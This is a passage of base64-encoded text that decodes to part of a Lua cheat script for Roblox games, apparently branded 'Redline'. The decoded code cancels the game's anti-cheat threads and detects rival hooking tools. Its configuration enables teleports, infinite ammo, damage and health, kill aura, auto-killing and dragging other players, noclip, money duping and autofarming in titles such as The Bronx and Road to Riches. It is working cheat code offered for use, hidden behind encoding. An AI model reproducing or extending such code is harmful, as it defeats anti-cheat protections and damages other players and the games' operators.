A9IExQSF9KSVRfTUFYKGZ1bmN0aW9uKC4uLikKICAgICAgICAgICAgbG9jYWwgUmFuZG9tX01lc3NhZ2UgPSBBbnRpQ2hlYXRfRW5jb2RlZFttYXRoLnJhbmRvbSgxLCAjQW50aUNoZWF0X0VuY29kZWQpXQogICAgICAgICAgICByZXR1cm4gQW50aUNoZWF0X0Z1bmN0aW9uKFJhbmRvbV9NZXNzYWdlKQogICAgICAgIGVuZCkKCiAgICAgICAgU2VydmljZXMuUnVuU2VydmljZS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QoTFBIX0pJVF9NQVgoZnVuY3Rpb24oKQogICAgICAgICAgICBBbnRpQ2hlYXRfVGhyZWFkcyA9IEdldF9BbnRpQ2hlYXRfVGhyZWFkcygpCgogICAgICAgICAgICBpZiBBbnRpQ2hlYXRfVGhyZWFkcyB0aGVuCiAgICAgICAgICAgICAgICBmb3IgaSA9IDEsICNBbnRpQ2hlYXRfVGhyZWFkcyBkbwogICAgICAgICAgICAgICAgICAgIGxvY2FsIFRocmVhZCA9IEFudGlDaGVhdF9UaHJlYWRzW2ldCgogICAgICAgICAgICAgICAgICAgIGlmIFRocmVhZCBhbmQgS2lsbGFibGVfVGhyZWFkc1tpXSA9PSB0cnVlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgdGFzay5jYW5jZWwoVGhyZWFkKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgWFZOUF9MKCkKICAgICAgICBlbmQpKQogICAgdGFzay53YWl0KDUpCmVuZAoKbG9jYWwgc2NyaXB0X2tleTsKCmlmIExQSF9PQkZVU0NBVEVEIHRoZW4KICAgIHNjcmlwdF9rZXkgPSBnZXRmZW52KCkuc2NyaXB0X2tleQplbmQKCmlmIHNjcmlwdF9rZXkgdGhlbgogICAgd3JpdGVmaWxlKCJSZWRsaW5lX0tleS50eHQiLCBzY3JpcHRfa2V5KQplbmQKCmRvIAogICAgUGxheWVycyA9IFNlcnZpY2VzLlBsYXllcnM7CiAgICBSZXBsaWNhdGVkU3RvcmFnZSA9IFNlcnZpY2VzLlJlcGxpY2F0ZWRTdG9yYWdlOwogICAgVXNlcklucHV0U2VydmljZSA9IFNlcnZpY2VzLlVzZXJJbnB1dFNlcnZpY2U7CiAgICBXb3Jrc3BhY2UgPSBTZXJ2aWNlcy5Xb3Jrc3BhY2U7CiAgICBSdW5TZXJ2aWNlID0gU2VydmljZXMuUnVuU2VydmljZTsKICAgIFByb3hpbWl0eVByb21wdFNlcnZpY2UgPSBTZXJ2aWNlcy5Qcm94aW1pdHlQcm9tcHRTZXJ2aWNlOwogICAgTWFya2V0cGxhY2VTZXJ2aWNlID0gU2VydmljZXMuTWFya2V0cGxhY2VTZXJ2aWNlOwogICAgU3RhcnRlckd1aSA9IFNlcnZpY2VzLlN0YXJ0ZXJHdWkKICAgIFZpcnR1YWxJbnB1dE1hbmFnZXIgPSBTZXJ2aWNlcy5WaXJ0dWFsSW5wdXRNYW5hZ2VyOwogICAgTGlnaHRpbmcgPSBTZXJ2aWNlcy5MaWdodGluZwogICAgbWF0aHJhbmRvbSA9IG1hdGgucmFuZG9tOwogICAgbWF0aGFicyA9IG1hdGguYWJzOwogICAgTW9iaWxlID0gVXNlcklucHV0U2VydmljZS5Ub3VjaEVuYWJsZWQKCiAgICBDYXJzID0ge30KCiAgICBDYW1lcmEgPSBXb3Jrc3BhY2UuQ3VycmVudENhbWVyYQoKICAgIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgogICAgTW91c2UgPSBMb2NhbFBsYXllcjpHZXRNb3VzZSgpCgogICAgTW92ZV9Nb3VzZV9GdW5jdGlvbiA9IG1vdXNlbW92ZXJlbAplbmQ7Cgpsb2NhbCBGaXJlU2VydmVyLCBJbnZva2VTZXJ2ZXIsIFVucmVsaWFibGVGaXJlU2VydmVyID0gSW5zdGFuY2UubmV3KCJSZW1vdGVFdmVudCIpLkZpcmVTZXJ2ZXIsIEluc3RhbmNlLm5ldygiUmVtb3RlRnVuY3Rpb24iKS5JbnZva2VTZXJ2ZXIsIEluc3RhbmNlLm5ldygiVW5yZWxpYWJsZVJlbW90ZUV2ZW50IikuRmlyZVNlcnZlcgoKaWYgaXNmdW5jdGlvbmhvb2tlZCB0aGVuCiAgICBpZiBpc2Z1bmN0aW9uaG9va2VkKEZpcmVTZXJ2ZXIpIG9yIGlzZnVuY3Rpb25ob29rZWQoVW5yZWxpYWJsZUZpcmVTZXJ2ZXIpIG9yIGlzZnVuY3Rpb25ob29rZWQoSW52b2tlU2VydmVyKSBhbmQgTFBIX09CRlVTQ0FURUQgdGhlbgogICAgICAgIHJldHVybiBTZXJ2aWNlcy5Mb2NhbFBsYXllcjpLaWNrKCJSZWRsaW5lIHwgU2VjdXJpdHkgOiBZb3UgYXJlIHJ1bm5pbmcgYW5vdGhlciBzY3JpcHQsIHBsZWFzZSBkaXNhYmxlIGl0IGFuZCBleGVjdXRlIGFnYWluIikKICAgIGVuZAplbmQKCmxvY2FsIFNhZmVQb3NpdGlvbiA9IENGcmFtZS5uZXcoLTQzNywgMzMsIDY2NTMpCgpsb2NhbCBDb25maWcgPSB7CiAgICBbIlRoZUJyb254Il0gPSB7CiAgICAgICAgWyJTZWxlY3RlZF9JdGVtIl0gPSAiLi4uIjsKCiAgICAgICBbIlRlbGVwb3J0YXRpb25MaXN0Il0gPSB7CiAgICAgICAgICAgIFsiRGVsaSBNYXJrZXQg8J+lqiJdID0gQ0ZyYW1lLm5ldygtNzM1LjUwLCAyNTQuNjksIC02ODYuNzIpOwogICAgICAgICAgICBbIkJhbmsg8J+PpiJdID0gQ0ZyYW1lLm5ldygtMjI1LjY0LCAyODMuODEsIC0xMjE0LjYxKTsKICAgICAgICAgICAgWyJJY2UgQm94IPCfp4oiXSA9IENGcmFtZS5uZXcoLTE5OC44OTI3MDAxOTUzMTI1LCAyODMuODQ4NjYzMzMwMDc4MSwgLTExNzAuNDUwMDczMjQyMTg3NSk7CiAgICAgICAgICAgIFsiU2FmZSDwn5SSIl0gPSBDRnJhbWUubmV3KDY4NTE5LjUyLCA1Mjk0MS42OCwgLTc5Mi4zOCk7CiAgICAgICAgICAgIFsiSG90ZWwg8J+PqCJdID0gQ0ZyYW1lLm5ldygtMTAxMiwgMjY2LCAtOTMzKTsKICAgICAgICAgICAgWyJEcmlwIFN0b3JlIPCfkZMiXSA9IENGcmFtZS5uZXcoNjc0NjIuNjk1MzEyNSwgMTA0ODkuMDMyMjI2NTYyNSwgNTQ2LjY3NjIwODQ5NjA5MzgpOwogICAgICAgICAgICBbIkNhciBEZWFsZXIg8J+alyJdID0gQ0ZyYW1lLm5ldygtNDA3LjAxLCAyNTMuNDEsIC0xMjQzLjE4KTsKICAgICAgICAgICAgWyJMYXVuZHJvbWF0IPCfkrciXSA9IENGcmFtZS5uZXcoLTk3OS40NjM1NjIwMTE3MTg4LCAyNTMuNjUzMTgyOTgzMzk4NDQsIC02ODkuMzMzOTIzMzM5ODQzOCk7CiAgICAgICAgICAgIFsiU3R1ZGlvIPCfjpkiXSA9IENGcmFtZS5uZXcoOTM0MDguNDUzMTI1LCAxNDQ4NC43MTU4MjAzMTI1LCA1NzAuMTM5NDA0Mjk2ODc1KTsKICAgICAgICAgICAgWyJOaWdodCBDbHViIPCfpYIiXSA9IENGcmFtZS5uZXcoLTkwLjAzLCAyODMuNzUsIC03MjguMDEpOwogICAgICAgICAgICBbIlJvYmJhYmxlIEljZSBCb3gg8J+niiJdID0gQ0ZyYW1lLm5ldygtMjA5LjY4MzYwOTAwODc4OTA2LCAyODMuNDk1OTQxMTYyMTA5NCwgLTEyNjUuNTI4Njg2NTIzNDM3NSk7CiAgICAgICAgICAgIFsiRXhvdGljIFNob3Ag8J+NgyJdID0gQ0ZyYW1lLm5ldygtMTUyMS45NDMxMTUyMzQzNzUsIDI3Mi41NDYyNjQ2NDg0Mzc1LCAtOTg0LjMwMjA2Mjk4ODI4MTIpOwogICAgICAgICAgICBbIkJyb254IE1hcmtldCDwn5KyIl0gPSBDRnJhbWUubmV3KC00MDIuMzQsIDMzNC4zMSwgLTU1Ni44MSk7CiAgICAgICAgICAgIFsiR3VuIFNob3Ag8J+UqyJdID0gQ0ZyYW1lLm5ldyg5Mjk3OCwgMTIyMDk5LCAxNzIzMik7CiAgICAgICAgICAgIFsiU2Vjb25kIEd1biBTaG9wIPCflKsiXSA9IENGcmFtZS5uZXcoNjYyMDIsIDEyMzYxNS43MTA5Mzc1LCA1NzQ5LjgxNjg5NDUzMTI1KTsKICAgICAgICAgICAgWyJFeG90aWMgR3VucyDwn5SrIl0gPSBDRnJhbWUubmV3KDYwODI5LjAwLCA4NzYwOS4zMiwgLTM1Mi44Nyk7CiAgICAgICAgICAgIFsiVGhpcmQgR3VuIFNob3Ag8J+UqyJdID0gQ0ZyYW1lLm5ldygtMTQ0MS41MSwgMjU2LjA2LCAyMTk1LjM1KTsKICAgICAgICAgICAgWyJTdHVkaW8gR3VucyDwn5SrIl0gPSBDRnJhbWUubmV3KDcyNDIxLjkzLCAxMjg4NTUuODMsIC0xMDgyLjU5KTsKICAgICAgICAgICAgWyJDb25zdHJ1Y3Rpb24gSm9iIPCflKgiXSA9IENGcmFtZS5uZXcoLTE3MjksIDM3MSwgLTExNzEpOwogICAgICAgICAgICBbIlNvZGEgam9iIPCfp7QiXSA9IENGcmFtZS5uZXcoLTM3NS40MywgMjU0LjIwLCAtNTgyLjc0KTsKICAgICAgICAgICAgWyJIb3NwaXRhbCDwn4+iICJdID0gQ0ZyYW1lLm5ldygtMTU3OS43OSwgMjUzLjk1LCAyNy4xNyk7CiAgICAgICAgICAgIFsiTWFyZ3JlZW5zIPCfkoogIl0gPSBDRnJhbWUubmV3KC0zNDUuMjUsIDI1NC40NSwgLTM5Mi40MSk7CiAgICAgICAgICAgIFsiT2xkIFBlbnRIb3VzZSDwn4+hICJdID0gQ0ZyYW1lLm5ldygtNTk3LjIwLCAzNTYuNTUsIC02ODguNTUpOwogICAgICAgICAgICBbIlBlbnRIb3VzZSDwn4yHICJdID0gQ0ZyYW1lLm5ldygtMTMwLjE0LCAzOTcuMTQsIC01NjQuNzApOwogICAgICAgICAgICBbIk9sZCBXYXJlSG91c2Ug8J+PrSJdID0gQ0ZyYW1lLm5ldygtMTc2LjkyLCAyODQuNjMsIC0yOTAuMzEpOwogICAgICAgICAgICBbIk5ldyBXYXJlSG91c2Ug8J+PrSJdID0gQ0ZyYW1lLm5ldygtMTA4LjY2LCAyODMuODEsIC00MDkuNDUpOwogICAgICAgICAgICBbIlNlbGwgU29kYSDwn5KyIl0gPSBDRnJhbWUubmV3KC0xMjkwLjc5LCAyNTMuMzAsIC0zMDA0LjkzKTsKICAgICAgICAgICAgWyJTdHJpa2VyIE1hbiDwn5qZIl0gPSBDRnJhbWUubmV3KC0xNDI0Ljk5LCAyNTQuMjIsIDI3ODYuOTApOwogICAgICAgICAgICBbIkJvb2tCYWdzIPCfjpIiXSA9IENGcmFtZS5uZXcoLTY5My43OSwgMjUzLjc4LCAtNjgxLjU3KTsKICAgICAgICAgICAgWyJQcmlzb24g4puT77iPIl0gPSBDRnJhbWUubmV3KC0xMTIwLjI5LCAyNTQuOTAsIC0zMzY0Ljg2KTsKICAgICAgICAgICAgWyJOWVBEIFJvb2Yg8J+RriJdID0gQ0ZyYW1lLm5ldygtMTM4OS45OCwgMjc5LjQ0LCAtMzE0MS4zNyk7CiAgICAgICAgICAgIFsiTWFuc2lvbiAg8J+PpPCfqbgiXSA9IENGcmFtZS5uZXcoLTc5Mi43MiwgMjUzLjMxLCAxNDAwLjczKTsKICAgICAgICAgICAgWyJTbGVkZ2VIYW1tZXIgSm9iIPCflKgiXSA9IENGcmFtZS5uZXcoLTEwMDcuNjQsIDI2Mi4yNiwgNTYuMDUpOwogICAgICAgICAgICBbIkJ1cnkgTW9uZXkg4pqw77iPIl0gPSBDRnJhbWUubmV3KC0xOTguNTMsIDIzOS41MSwgMTI2Ni4wNCk7CiAgICAgICAgICAgIFsiTWNEb25hbGRzIPCfjZQiXSA9IENGcmFtZS5uZXcoLTEwMTEuMzQsIDI1My45MywgLTExNDcuNzYpOwogICAgICAgICAgICBbIlBvcGV5ZXMg8J+NlyJdID0gQ0ZyYW1lLm5ldygtNzguMDQsIDI4My42MywgLTc2OC4xMSk7CiAgICAgICAgfTsKCiAgICAgICAgWyJNb2RpZmljYXRpb25zIl0gPSBuZXdwcm94eSh0cnVlKTsKICAgIAogICAgICAgIFsiX01vZGlmaWNhdGlvbnMiXSA9IHsKICAgICAgICAgICAgWyJEaXNhYmxlSmFtbWluZyJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiTW9kaWZ5U3ByZWFkVmFsdWUiXSA9IGZhbHNlOwogICAgICAgICAgICBbIk1vZGlmeVJlY29pbFZhbHVlIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJBdXRvbWF0aWMiXSA9IGZhbHNlOwogICAgICAgICAgICBbIk1vZGlmeUZpcmVSYXRlIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJNb2RpZnlSZWxvYWRTcGVlZCJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiTW9kaWZ5RXF1aXBTcGVlZCJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiSW5maW5pdGVBbW1vIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJJbmZpbml0ZUNsaXBzIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJJbmZpbml0ZURhbWFnZSJdID0gZmFsc2U7CgogICAgICAgICAgICBbIkZpcmVSYXRlU3BlZWQiXSA9IDUwOwogICAgICAgICAgICBbIlNwcmVhZFBlcmNlbnRhZ2UiXSA9IDUwOwogICAgICAgICAgICBbIlJlY29pbFBlcmNlbnRhZ2UiXSA9IDUwOwogICAgICAgICAgICBbIlJlbG9hZFNwZWVkIl0gPSA1MDsKICAgICAgICAgICAgWyJFcXVpcFNwZWVkIl0gPSA1MDsKICAgICAgICB9OwoKICAgICAgICBbIlBsYXllck1vZGlmaWNhdGlvbnMiXSA9IHsKICAgICAgICAgICAgWyJJbmZpbml0ZVNsZWVwIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJJbmZpbml0ZVN0YW1pbmEiXSA9IGZhbHNlOwogICAgICAgICAgICBbIkluZmluaXRlSHVuZ2VyIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJJbnN0YW50SW50ZXJhY3QiXSA9IGZhbHNlOwogICAgICAgICAgICBbIkZhc3RSZXNwYXduIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJBdXRvUGlja3VwQ2FzaCJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiQXV0b1BpY2t1cEJhZ3MiXSA9IGZhbHNlOwogICAgICAgICAgICBbIkRpc2FibGVDYW1lcmFCb2JiaW5nIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJCeXBhc3NMb2NrZWRDYXJzIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJEaXNhYmxlQmxvb2RFZmZlY3RzIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJOb1JlbnRQYXkiXSA9IGZhbHNlOwogICAgICAgICAgICBbIkFudGlMb3NlSXRlbXMiXSA9IGZhbHNlOwogICAgICAgICAgICBbIlJlZGxpbmVOYW1lVGFnIl0gPSBmYWxzZTsgICAgICAgICAgICAKICAgICAgICAgICAgWyJOb0p1bXBDb29sZG93biJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiTm9GYWxsRGFtYWdlIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJOb0tub2NrYmFjayJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiSW5maW5pdGVIZWFsdGgiXSA9IGZhbHNlOwogICAgICAgICAgICBbIlJlc3Bhd25XaGVyZVlvdURpZWQiXSA9IGZhbHNlOwogICAgICAgIH07CgogICAgICAgIFsiSW5maW5pdGVIZWFsdGgiXSA9IGZhbHNlOwoKICAgICAgICBbIlN0b3JlRHVwZWRJdGVtIl0gPSBmYWxzZTsKICAgICAgICBbIlNlbGVjdGVkX0xvY2F0aW9uIl0gPSAiLi4uIjsKICAgICAgICBbIkNsaWNrVGVsZXBvcnRBY3RpdmUiXSA9IGZhbHNlOwoKICAgICAgICBbIlBsYXllclV0aWxpdGllcyJdID0gewogICAgICAgICAgICBbIlNlbGVjdGVkUGxheWVyIl0gPSAiLi4uIjsKICAgICAgICAgICAgWyJCcmluZ2luZ1BsYXllciJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiU3BlY3RhdGVQbGF5ZXIiXSA9IGZhbHNlOwogICAgICAgICAgICBbIkF1dG9LaWxsIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJBdXRvUmFnZG9sbCJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiQnVnUGxheWVyIl0gPSBmYWxzZTsKICAgICAgICB9OwoKICAgICAgICBbIlZlaGljbGVNb2RpZmljYXRpb25zIl0gPSB7CiAgICAgICAgICAgIFsiU3BlZWRFbmFibGVkIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJTcGVlZFZhbHVlIl0gPSAxMC8xMDAwOwogICAgICAgICAgICBbIkJyZWFrRW5hYmxlZCJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiQnJlYWtWYWx1ZSJdID0gNTAvMTAwMDsKICAgICAgICAgICAgWyJJbnN0YW50U3RvcCJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiSW5zdGFudFN0b3BCaW5kIl0gPSBFbnVtLktleUNvZGUuVjsKICAgICAgICB9OwoKICAgICAgICBbIkZhcm1zIl0gPSB7CiAgICAgICAgICAgIFsiQ29sbGVjdERyb3BwZWRNb25leSJdID0gZmFsc2U7CgogICAgICAgICAgICBbIkNvbGxlY3REcm9wcGVkTG9vdCJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiT25seUNvbGxlY3RHdW5zIl0gPSBmYWxzZTsKCiAgICAgICAgICAgIFsiQUZLQ2hlY2siXSA9IGZhbHNlOwogICAgICAgICAgICBbIkZhcm1Db25zdHJ1Y3Rpb25Kb2IiXSA9IGZhbHNlOwogICAgICAgICAgICBbIkZhcm1CYW5rIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJGYXJtSG91c2VzIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJGYXJtU3R1ZGlvIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJGYXJtVHJhc2giXSA9IGZhbHNlOwogICAgICAgICAgICBbIkF1dG9TZWxsVHJhc2giXSA9IGZhbHNlOwogICAgICAgIH07CgogICAgICAgIFsiS2lsbEF1cmEiXSA9IGZhbHNlOwogICAgICAgIFsiS2lsbEF1cmFSYW5nZSJdID0gMzAwOwogICAgICAgIFsiS2lsbEF1cmFXaGl0ZWxpc3QiXSA9IHt9OwoKICAgICAgICBbIkF1dG9Ecm9wIl0gPSBmYWxzZTsKICAgICAgICBbIk1vbmV5QW1vdW50Il0gPSBmYWxzZTsKCiAgICAgICAgWyJjYXJmbHkiXSA9IGZhbHNlOwogICAgICAgIFsiY2FyZmx5c3BlZWQiXSA9IDIwOwoKICAgICAgICBbImFudGlhZmsiXSA9IGZhbHNlOwoKICAgICAgICBbInNwaW5ib3R0ZXIiXSA9IGZhbHNlOwogICAgICAgIFsic3BpbmJvdHRlcnNwZWVkIl0gPSBmYWxzZTsKCiAgICAgICAgWyJhdXRvcGFzcyJdID0gZmFsc2U7CgogICAgICAgICBbIm1hc2tlZHVwIl0gPSBmYWxzZTsKCiAgICAgICAgWyJkZXBvcyJdID0gZmFsc2U7CiAgICAgICAgWyJEZXBvc2l0QW1vdW50Il0gPSBmYWxzZTsKCiAgICAgICAgWyJkcmF3dyJdID0gZmFsc2U7CiAgICAgICAgWyJXaXRoZHJhd0Ftb3VudCJdID0gZmFsc2U7CgogICAgICAgIFsiaW52aXNmbHkiXSA9IGZhbHNlOwogICAgICAgIFsiaW52aXNmbHlzcGVlZCJdID0gNTA7ICAgICAgICAKCiAgICAgICAgWyJ0YjNfZm92Il0gPSBmYWxzZTsKICAgICAgICBbIkZpZWxkT2ZWaWV3VmFsdWUiXSA9IDgwOwoKICAgICAgICBbImZseW5ldyJdID0gZmFsc2U7CgogICAgICAgIFsiaW4zMjF5Il0gPSB7CiAgICAgICAgICAgIFsiRW5hYmxlZCJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiaW4zMSJdID0gNTA7CiAgICAgICAgfTsKICAgIH07CgogICAgWyJCbG9ja1NwaW4iXSA9IHsKICAgICAgICBbIkxvY2FsUGxheWVyIl0gPSB7CiAgICAgICAgICAgIFsiSW5maW5pdGVTdGFtaW5hIl0gPSBmYWxzZTsKICAgICAgICB9OwoKICAgICAgICBbIkF1dG9GYXJtaW5nIl0gPSB7CiAgICAgICAgICAgIFsiRmFybU1vcHMiXSA9IGZhbHNlOwogICAgICAgICAgICBbIk1vcFR5cGUiXSA9ICJEZWZhdWx0IjsKICAgICAgICB9OwogICAgfTsKCiAgICBbIlJvYWRfVG9fUmljaGVzIl0gPSB7CiAgICAgICAgWyJfTW9kaWZpY2F0aW9ucyJdID0gewogICAgICAgICAgICBbIkV4cGxvc2l2ZUJ1bGxldHMiXSA9IGZhbHNlOwogICAgICAgICAgICBbIkluZmluaXRlQW1tbyJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiSW5maW5pdGVEYW1hZ2UiXSA9IGZhbHNlOwogICAgICAgICAgICBbIkluc3RhbnRSZWxvYWQiXSA9IGZhbHNlOwogICAgICAgICAgICBbIkluc3RhbnRFcXVpcCJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiQXV0b21hdGljIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJSYXBpZEZpcmUiXSA9IGZhbHNlOwogICAgICAgICAgICBbIk5vU3ByZWFkIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJOb1JlY29pbCJdID0gZmFsc2U7CiAgICAgICAgfTsKCiAgICAgICAgWyJMb2NhdGlvbnMiXSA9IHsKICAgICAgICAgICAgWyJBVE0g8J+PpyJdID0gQ0ZyYW1lLm5ldygzNjAsIDI1NjMsIDE5NDYpOwogICAgICAgICAgICBbIkd1biBEZWFsZXIg8J+UqyJdID0gQ0ZyYW1lLm5ldygyMzEsIDI1NDUsIDEwNjUpOwogICAgICAgICAgICBbIkdvbGQgU2hvcCDwn6qZIl0gPSBDRnJhbWUubmV3KC03OC4xMTU4MjE4MzgzNzg5LCAyNTYzLjExMjMwNDY4NzUsIDk0NC43NDM2NTIzNDM3NSk7CiAgICAgICAgICAgIFsiQmFyYmVyIPCfkogiXSA9IENGcmFtZS5uZXcoMTIxNy42NTMxOTgyNDIxODc1LCAyNTU3LjkzODk2NDg0Mzc1LCA5ODEuMTgyODYxMzI4MTI1KTsKICAgICAgICAgICAgWyJNb25kZXJlbGxhIPCfjZUiXSA9IENGcmFtZS5uZXcoNDI4Ljg5NTgxMjk4ODI4MTI1LCAyNTYzLjMxMDA1ODU5Mzc1LCAxMjc1LjQ5MTgyMTI4OTA2MjUpOwogICAgICAgICAgICBbIkRlbGkg8J+lqiJdID0gQ0ZyYW1lLm5ldygtNzAuMjc0NDM2OTUwNjgzNiwgMjU2Mi44MDc4NjEzMjgxMjUsIDcxOS45Njc2NTEzNjcxODc1KTsKICAgICAgICAgICAgWyJMaWJyYXJ5IPCfk5YiXSA9IENGcmFtZS5uZXcoNTMuNDc3MTY5MDM2ODY1MjM0LCAyNTYyLjkwODIwMzEyNSwgMTk2MC42NDQ0MDkxNzk2ODc1KTsKICAgICAgICAgICAgWyJMYWJvcmF0b3J5IPCflKwiXSA9IENGcmFtZS5uZXcoNTY0LCAyNTYzLCAxOTU3KTsKICAgICAgICAgICAgWyJIb3QgRG9nIFN0YW5kIPCfjK0iXSA9IENGcmFtZS5uZXcoMjk1LjU3NDAzNTY0NDUzMTI1LCAyNTYyLjc2NDY0ODQzNzUsIDE5OTYuMjQzNTMwMjczNDM3NSk7CiAgICAgICAgICAgIFsiR3ltIPCfkqoiIF0gPSBDRnJhbWUubmV3KC0zNy45MjA3MTkxNDY3Mjg1MTYsIDI1NjMuMDUwMjkyOTY4NzUsIDQ0Mi4zMjY0NzcwNTA3ODEyNSk7CiAgICAgICAgICAgIFsiQmFua3MgQnVyZ2VycyDwn42UIl0gPSBDRnJhbWUubmV3KDc5NC4yNTQ3NjA3NDIxODc1LCAyNTYyLjkzNzAxMTcxODc1LCAzMTEuODA5NzIyOTAwMzkwNik7CiAgICAgICAgICAgIFsiTGF1bmRyb21hdCDwn5K3Il0gPSBDRnJhbWUubmV3KDQwMi42NjE3MTI2NDY0ODQ0LCAyNTYyLjg5MjgyMjI2NTYyNSwgMTUwMy4yNjQ1MjYzNjcxODc1KTsKICAgICAgICAgICAgWyJDb2NhaW5lIEZhY3Rvcnkg8J+PrSJdID0gQ0ZyYW1lLm5ldygxMjI3LCAyNTI5LCAxOTg3KTsKICAgICAgICAgICAgWyJDb29raW5nIFBvdHMg8J+nqiJdID0gQ0ZyYW1lLm5ldygxMzEsIDI1NDAsIDEwMDQpOwogICAgICAgICAgICBbIlNjcmFwIE1ldGFsIOKaku+4jyJdID0gQ0ZyYW1lLm5ldygxMDQ5LCAyNTYzLCAxMDUyKTsKICAgICAgICB9OwoKICAgICAgICBbIlBhY2tGYXJtIl0gPSB7CiAgICAgICAgICAgIFsiRW5hYmxlZCJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiQWxsb3dlZFBhY2tzIl0gPSB7fTsKICAgICAgICAgICAgWyJBbGxvd2VkSnVua2llcyJdID0ge307CiAgICAgICAgfTsKCiAgICAgICAgWyJJbmZpbml0ZUNsaXBzIl0gPSBmYWxzZTsKICAgICAgICBbIkluZmluaXRlU3RhbWluYSJdID0gZmFsc2U7CiAgICAgICAgWyJJbmZpbml0ZUVuZXJneSJdID0gZmFsc2U7CgogICAgICAgIFsiTW9kaWZpY2F0aW9ucyJdID0gbmV3cHJveHkodHJ1ZSk7CgogICAgICAgIFsiSW5zdGFudEludGVyYWN0Il0gPSBmYWxzZTsKCiAgICAgICAgWyJFU1AiXSA9IHsKICAgICAgICAgICAgWyJQb3RzIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJBbGxvd2VkUG90cyJdID0ge30KICAgICAgICB9OwogICAgfTsKCiAgICBbIlNvdXRoX0Jyb254Il0gPSB7CiAgICAgICAgWyJMb2NhbFBsYXllcl9Db25maWciXSA9IHsKICAgICAgICAgICAgWyJJbnN0YW50SW50ZXJhY3QiXSA9IGZhbHNlOwogICAgICAgICAgICBbIkRlbGV0ZU9uS2V5Il0gPSBmYWxzZTsKICAgICAgICAgICAgWyJEZWxldGVLZXkiXSA9IG5pbDsKICAgICAgICAgICAgWyJOb0NsaXAiXSA9IGZhbHNlOwogICAgICAgICAgICBbIkhpZGVOYW1lIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJJbmZpbml0ZVN0YW1pbmEiXSA9IGZhbHNlOwogICAgICAgICAgICBbIlNwZWVkIl0gPSBmYWxzZTsKICAgICAgICAgICAgWyJTcGVlZFZhbHVlIl0gPSAwLjc1OwogICAgICAgIH07CgogICAgICAgIFsiVGVsZXBvcnRNZXRob2QiXSA9ICJEYW1hZ2UiOwoKICAgICAgICBbIkZhcm1pbmdVdGlsaXRpZXMiXSA9IHsKICAgICAgICAgICAgWyJDYXJkRmFybSJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiQm94RmFybSJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiQ2hpcEZhcm0iXSA9IGZhbHNlOwogICAgICAgICAgICBbIk1hcnNobWFsbG93RmFybSJdID0gZmFsc2U7CiAgICAgICAgICAgIFsiTWFyc2htYWxsb3dJbmNyZW1lbnQiXSA9IDU7CiAgICAgICAgfTsKCiAgICAgICAgWyJPd25lZEJpa2UiXSA9ICJVbmtub3duIjsKCiAgICAgICAgWyJHdW5zIl0gPSB7fTsKCiAgICAgICAgWyJTZWxlY3RlZF9JdGVtIl0gPSAiLi4uIjsKICAgICAgICBbIkl0ZW1fQW1vdW50Il0gPSAxOwoKICAgICAgICBbIkxvY2F0aW9ucyJdID0gewogICAgICAgICAgICBbIk1haW4gR3VuIFN0b3JlIPCflKsiXSA9IENGcmFtZS5uZXcoMjE5LCA2LCAtMTU4KTsKICAgICAgICAgICAgWyJCbGFjayBNYXJrZXQg8J+SuSJdID0gQ0ZyYW1lLm5ldyg2NzEsIDYsIDI1MSk7CiAgICAgICAgICAgIFsiRGVhbGVyU2hpcCDwn5qXIl0gPSBDRnJhbWUubmV3KDczOCwgNiwgNDM5KTsKICAgICAgICAgICAgWyJEZWFsZXJTaGlwIEFwYXJ0bWVudHMg8J+MhyJdID0gQ0ZyYW1lLm5ldyg3MTcsIDUsIDU0OCk7CiAgICAgICAgICAgIFsiQ2xvdGhlcyBTdG9yZSDwn5GVIl0gPSBDRnJhbWUubmV3KC0xOTcsIDYsIC03NCk7CiAgICAgICAgICAgIFsiQm94IEpvYiBBcGFydG1lbnRzIPCfk6YiXSA9IENGcmFtZS5uZXcoLTUyNywgNiwgMTQyKTsKICAgICAgICAgICAgWyJCYW5rIPCfkrMiXSA9IENGcmFtZS5uZXcoLTQ3LCA2LCAtMzQwKTsKICAgICAgICAgICAgWyJGYWtlIElEIFNlbGxlciDwn46rIl0gPSBDRnJhbWUubmV3KDIxOSwgNiwgLTMzMSk7CiAgICAgICAgICAgIFsiRE9BIFR1cmYg8J+UtCJdID0gQ0ZyYW1lLm5ldygtMzM1LCA2LCAtNDE1KTsKICAgICAgICAgICAgWyJPR1